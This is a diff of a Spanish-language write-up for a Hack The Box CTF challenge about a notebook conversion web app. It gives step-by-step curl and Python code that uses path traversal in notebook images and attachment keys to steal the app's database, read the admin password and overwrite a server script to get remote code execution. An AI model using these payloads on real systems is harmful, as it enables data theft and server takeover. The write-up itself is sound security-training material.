@@ -40,16 +40,16 @@ Se sube un notebook `.ipynb` legítimo y se intercepta el request. El `POST /con
 POST /convert HTTP/1.1
 Host: <target>
 Cookie: session=<token>
-Content-Type: multipart/form-data; boundary=----...
+Content-Type: multipart/form-data; boundary=...
 
-------...
+...
 Content-Disposition: form-data; name="notebook"; filename="test.ipynb"
 ...contenido del notebook...
-------...
+...
 Content-Disposition: form-data; name="format"
 
 html
-------...--
+...
 ```
 ![alt text](images/ncp3.png)
 
@@ -146,38 +146,37 @@ Sin embargo, esta funcionalidad está desactivada por defecto (`asset_storage_en
 
 
 
-### 3. Explotación Paso a Paso
+### 3. Exploit
 
-#### Paso 1 — Registro y login de usuario de prueba
+#### 3.1. Registro y login de usuario de prueba
 
 ```bash
-TARGET="http://<ip>:<puerto>"
+TARGET="http://154.57.164.74:32480"
 
 # Registro del usuario de ataque
-curl -s -X POST "$TARGET/register" -c /tmp/c.txt \
-  -d "username=attacker&password=attacker123&confirm_password=attacker123"
+curl -s -X POST "$TARGET/register" -c /tmp/user_cookies.txt \
+  -d "username=$USER&password=$PASS&confirm_password=$PASS"
 
 # Login — guarda la cookie de sesión en /tmp/c.txt
-curl -s -X POST "$TARGET/" -c /tmp/c.txt -b /tmp/c.txt \
-  -d "username=attacker&password=attacker123" -L -o /dev/null
+curl -s -X POST "$TARGET/" -c /tmp/user_cookies.txt -b /tmp/user_cookies.txt \
+  -d "username=$USER&password=$PASS" -L -o /dev/null
 ```
 
-**En Burp:** en HTTP history se observa el POST a `/register` con 302, luego el POST a `/` con otro 302 hacia `/dashboard`. La cookie `session=...` queda registrada.
+![alt text](images/ncp4.png)
 
-> **[Screenshot: Burp HTTP history — POST /register y POST / con sus redirects]**
 
----
-
-#### Paso 2 — Construir el notebook para robar la DB
+#### 3.2. Construir el notebook para robar la DB
 
 ```bash
-cat > /tmp/steal.ipynb << 'EOF'
+cat > /tmp/steal.ipynb << 'NOTEBOOK'
 {
-  "cells": [{
-    "cell_type": "markdown",
-    "metadata": {},
-    "source": ["![](../../../../data/app.db)"]
-  }],
+  "cells": [
+    {
+      "cell_type": "markdown",
+      "metadata": {},
+      "source": ["![](../../../../data/app.db)"]
+    }
+  ],
   "metadata": {
     "kernelspec": {"display_name": "Python 3", "language": "python", "name": "python3"},
     "language_info": {"name": "python", "version": "3.11.0"}
@@ -185,118 +184,83 @@ cat > /tmp/steal.ipynb << 'EOF'
   "nbformat": 4,
   "nbformat_minor": 4
 }
-EOF
+NOTEBOOK
 ```
 
 La ruta `../../../../data/app.db` navega desde `data/jobs/<id>/incoming/` (donde se guarda el notebook) hasta `data/app.db` (la base de datos de la aplicación).
 
 
 
-#### Paso 3 — Subir el notebook y descargar el HTML con la DB embebida
+#### 3.3 Subir el notebook y descargar el HTML con la DB embebida
 
 ```bash
 # Subir el notebook malicioso
 curl -s -X POST "$TARGET/convert" \
-  -c /tmp/c.txt -b /tmp/c.txt \
+  -c /tmp/user_cookies.txt -b /tmp/user_cookies.txt \
   -F "notebook=@/tmp/steal.ipynb" \
   -F "format=html" \
-  -D /tmp/headers.txt \
-  -o /dev/null
+  -D /tmp/headers.txt -o /dev/null
 
 # Extraer el job_id del header Location del redirect
 JOB_ID=$(grep -i 'location:' /tmp/headers.txt | grep -oP '/jobs/\K[0-9a-f]+')
-echo "[+] Job ID: $JOB_ID"
+echo "job: $JOB_ID"
 
 # Descargar el HTML con la DB embebida
 curl -s "$TARGET/jobs/$JOB_ID/download" \
-  -c /tmp/c.txt -b /tmp/c.txt -o /tmp/db_out.html
+  -c /tmp/user_cookies.txt -b /tmp/user_cookies.txt \
+  -o /tmp/db_out.html
 
-echo "[+] Tamaño: $(wc -c < /tmp/db_out.html) bytes"
-# [+] Tamaño: 320318 bytes
+echo "$(wc -c < /tmp/db_out.html) bytes -> /tmp/db_out.html"
 ```
 
-**En Burp Repeater:** enviando un GET a `/jobs/<job_id>/download` se puede ver el response body. Buscando `base64,` aparece un blob de varios cientos de KB que corresponde al contenido de la DB codificado en base64.
+![alt text](images/ncp5.png)
 
-> **[Screenshot: Burp Repeater — response body del download con el blob base64 de la DB]**
+#### 3.4. Extraer la contraseña del admin de la DB robada
 
-
-
-#### Paso 4 — Extraer la contraseña del admin de la DB robada
-
-El HTML contiene múltiples blobs base64 (recursos del tema de nbconvert: fuentes, íconos, CSS). Para identificar cuál es el SQLite se verifica la firma mágica de los archivos. Primero una inspección rápida con `xxd`:
-
-```bash
-# Extraer todos los blobs y buscar la firma SQLite
-grep -oP 'base64,\K[A-Za-z0-9+/=]{500,}' /tmp/db_out.html | \
-  while read b; do
-    decoded=$(echo "$b" | base64 -d 2>/dev/null)
-    sig=$(echo "$decoded" | xxd | head -1)
-    echo "$sig"
-  done | grep -i sqlite
-# 00000000: 5351 4c69 7465 2066 6f72 6d61 7420 3300  SQLite format 3.
-```
-
-Confirmada la firma, se extrae la contraseña con Python:
+El HTML contiene múltiples blobs base64 (recursos del tema de nbconvert: fuentes, íconos, CSS). Se extrae la contraseña con Python:
 
 ```python
 # extract_creds.py
 import re, base64, sqlite3
 
 html = open('/tmp/db_out.html', 'rb').read().decode('utf-8', errors='replace')
+matches = re.findall(r'data:[^;]*;base64,([A-Za-z0-9+/=]+)', html)
 
-for m in re.findall(r'data:[^;]*;base64,([A-Za-z0-9+/=]+)', html):
+for m in matches:
     try:
         data = base64.b64decode(m)
     except Exception:
         continue
 
     if data[:6] == b'SQLite':
-        print(f"[+] SQLite encontrado ({len(data)} bytes)")
         open('/tmp/stolen.db', 'wb').write(data)
-
         conn = sqlite3.connect('/tmp/stolen.db')
-        rows = conn.execute("SELECT username, password, role FROM users").fetchall()
+        for row in conn.execute("SELECT username, password, role FROM users"):
+            print(f"{row[0]}:{row[1]} ({row[2]})")
         conn.close()
-
-        for row in rows:
-            print(f"    {row[0]} | {row[1]} | {row[2]}")
         break
 ```
 
-```bash
-python3 extract_creds.py
-# [+] SQLite encontrado (xxxxx bytes)
-#     attacker  | attacker123          | user
-#     admin     | 8SMnPhCXWiF2Mozdv4U  | admin
-```
-
-> **[Screenshot: terminal con la salida del script mostrando las credenciales del admin]**
+![alt text](images/ncp6.png)
 
 
 
-#### Paso 5 — Login como admin y activar `asset_storage_enabled`
+#### 3.5. Login como admin y activar `asset_storage_enabled`
 
 ```bash
-ADMIN_PASS="8SMnPhCXWiF2Mozdv4U"
+ADMIN_PASS="IGD40-eerRdFR5upjG0"
 
-# Login admin — nueva cookie en /tmp/a.txt
-curl -s -X POST "$TARGET/" -c /tmp/a.txt -b /tmp/a.txt \
+curl -s -X POST "$TARGET/" -c /tmp/admin_cookies.txt -b /tmp/admin_cookies.txt \
   -d "username=admin&password=$ADMIN_PASS" -L -o /dev/null
 
-# Activar asset_storage desde el panel de admin
-curl -s -X POST "$TARGET/admin" -c /tmp/a.txt -b /tmp/a.txt \
+curl -s -X POST "$TARGET/admin" -c /tmp/admin_cookies.txt -b /tmp/admin_cookies.txt \
   -d "asset_storage_enabled=on" -o /dev/null
 ```
 
-**En Burp:** se puede verificar haciendo un GET a `/admin` con las cookies de admin. La respuesta 200 confirma acceso al panel. Tras el POST se puede hacer otro GET y verificar en el HTML de respuesta que el checkbox `asset_storage_enabled` aparece marcado.
-
-> **[Screenshot: Burp Repeater — GET /admin con respuesta 200 (acceso confirmado)]**
-
-> **[Screenshot: Burp Repeater — POST /admin con asset_storage_enabled=on y el GET de confirmación]**
+![alt text](images/ncp7.png)
 
 
-
-#### Paso 6 — Construir el notebook con el payload RCE
+#### 3.6. Construir el notebook con el payload RCE
 
 El payload que reemplazará a `convert_job.py` debe:
 1. Ejecutar `/readflag` para obtener la flag.
@@ -304,11 +268,9 @@ El payload que reemplazará a `convert_job.py` debe:
 3. Imprimir exactamente `{"status": "ok", "output_path": "..."}` en stdout, que es el contrato que `conversions.py` espera para marcar el job como completado y exponer el archivo en `/download`.
 
 ```python
-# build_payload.py
 import json, base64
 
-payload_code = r"""
-import subprocess, json, argparse
+code = r"""import subprocess, json, argparse
 from pathlib import Path
 
 r = subprocess.run(['/readflag'], capture_output=True, text=True)
@@ -330,10 +292,10 @@ nb = {
     "metadata": {},
     "attachments": {
       "../../../../app/converter/convert_job.py": {
-        "application/octet-stream": base64.b64encode(payload_code.encode()).decode()
+        "application/octet-stream": base64.b64encode(code.encode()).decode()
       }
     },
-    "source": ["# notebook"]
+    "source": ["# x"]
   }],
   "metadata": {
     "kernelspec": {"display_name": "Python 3", "language": "python", "name": "python3"},
@@ -344,91 +306,60 @@ nb = {
 }
 
 json.dump(nb, open('/tmp/pwn.ipynb', 'w'), indent=2)
-print("[+] pwn.ipynb creado")
-```
-
-```bash
-python3 build_payload.py
-# [+] pwn.ipynb creado
+print("[+] /tmp/pwn.ipynb")
 ```
 
 **Por qué funciona la clave del attachment:** `FilesWriter` itera sobre el diccionario de outputs del notebook y usa la clave de cada entrada directamente como nombre de archivo al escribirlo en disco. La clave `../../../../app/converter/convert_job.py`, concatenada con el `build_directory` del job (directorio de exports), resuelve a la ruta absoluta del script legítimo en el servidor.
 
 
 
-#### Paso 7 — Subir `pwn.ipynb` para sobreescribir el script
+#### 3.7. Subir `pwn.ipynb` para sobreescribir el script
 
 ```bash
 curl -s -X POST "$TARGET/convert" \
-  -c /tmp/a.txt -b /tmp/a.txt \
+  -c /tmp/admin_cookies.txt -b /tmp/admin_cookies.txt \
   -F "notebook=@/tmp/pwn.ipynb" \
   -F "format=markdown" \
-  -D /tmp/pwn_headers.txt \
-  -o /dev/null
+  -D /tmp/pwn_headers.txt -o /dev/null
 
-PWN_JOB=$(grep -i 'location:' /tmp/pwn_headers.txt | grep -oP '/jobs/\K[0-9a-f]+')
-echo "[+] PWN Job: $PWN_JOB"
+JOB_ID=$(grep -i 'location:' /tmp/pwn_headers.txt | grep -oP '/jobs/\K[0-9a-f]+')
+echo "pwn job: $JOB_ID"
 ```
 
-**En Burp:** en HTTP history aparece el POST a `/convert` con `pwn.ipynb`. La respuesta es un 302 hacia `/jobs/<pwn_job_id>`. El job puede quedar con estado `failed` — esto es normal: `FilesWriter` escribe el attachment en disco antes de que ocurra cualquier error de conversión posterior. Lo importante es que `convert_job.py` ya fue sobreescrito.
-
-> **[Screenshot: Burp HTTP history — POST /convert con pwn.ipynb y redirect resultante]**
-
-
-
-#### Paso 8 — Triggear el RCE enviando cualquier conversión
+#### 3.8. Triggear el RCE enviando cualquier conversión
 
 Con `convert_job.py` reemplazado, cualquier nueva conversión ejecutará el payload. Se reutiliza el `steal.ipynb` anterior:
 
 ```bash
 curl -s -X POST "$TARGET/convert" \
-  -c /tmp/a.txt -b /tmp/a.txt \
+  -c /tmp/admin_cookies.txt -b /tmp/admin_cookies.txt \
   -F "notebook=@/tmp/steal.ipynb" \
   -F "format=html" \
-  -D /tmp/rce_headers.txt \
-  -o /dev/null
+  -D /tmp/rce_headers.txt -o /dev/null
 
-JOB_ID2=$(grep -i 'location:' /tmp/rce_headers.txt | grep -oP '/jobs/\K[0-9a-f]+')
-echo "[+] RCE Job: $JOB_ID2"
+JOB_ID=$(grep -i 'location:' /tmp/rce_headers.txt | grep -oP '/jobs/\K[0-9a-f]+')
+echo "job: $JOB_ID"
 
-curl -s "$TARGET/jobs/$JOB_ID2/download" \
-  -c /tmp/a.txt -b /tmp/a.txt -o /tmp/flag_out.html
-
-echo "[+] Tamaño: $(wc -c < /tmp/flag_out.html) bytes"
+curl -s "$TARGET/jobs/$JOB_ID/download" \
+  -c /tmp/admin_cookies.txt -b /tmp/admin_cookies.txt \
+  -o /tmp/flag_out.html
 ```
 
-**En Burp Repeater:** el GET a `/jobs/<rce_job_id>/download` devuelve un HTML pequeño (~72 bytes). En el response body se ve directamente el contenido con la flag.
-
-> **[Screenshot: Burp Repeater — GET /jobs/<rce_job_id>/download con la flag en el response body]**
-
-
-
-#### Paso 9 — Flag
+#### 3.9 Flag
 
 ```bash
-FLAG=$(grep -oP 'HTB\{[^}]+\}' /tmp/flag_out.html)
-echo "[+] FLAG: $FLAG"
+grep -oP 'HTB\{[^}]+\}' /tmp/flag_out.html
 ```
 
 ```
-[+] FLAG: HTB{y3t_4n0th3r_pyth0n_c0nv3rt3r_cve}
+FLAG: HTB{y3t_4n0th3r_pyth0n_c0nv3rt3r_cve}
 ```
 
-> **[Screenshot: terminal con la flag obtenida]**
+![alt text](images/ncp8.png)
 
+![alt text](images/ncp9.png)
 
-
-### Problemas Encontrados
-
-**Identificar el blob SQLite entre múltiples blobs base64.** El HTML de nbconvert incluye varios recursos embebidos (fuentes, íconos). Al buscar `base64,` en Burp aparecen múltiples coincidencias. La solución fue verificar la firma mágica `SQLite format 3\x00` en los primeros bytes de cada blob decodificado para identificar únicamente la base de datos.
-
-**El job de sobreescritura queda en estado `failed`.** Al subir `pwn.ipynb`, `FilesWriter` escribe el attachment pero el proceso de conversión puede fallar después porque el notebook no produce Markdown válido. Esto no importa: la escritura del archivo ocurre antes que cualquier error de conversión, y `convert_job.py` queda sobreescrito de todas formas.
-
-**El payload debe respetar el contrato JSON de `conversions.py`.** Si el script sobreescrito no imprime `{"status": "ok", "output_path": "..."}` en stdout, `conversions.py` marca el job como `failed` y no registra ningún `output_path` en la DB, haciendo imposible descargar la flag. El payload fue diseñado para imitar exactamente ese contrato y escribir el resultado en el `output_dir` del job para que sea accesible vía `/download`.
-
-
-
-## Vulnerabilidades
+### Vulnerabilidades
 
 | # | Vulnerabilidad | Archivo afectado | CWE | CAPEC | Impacto |
 |---|---|---|---|---|---|
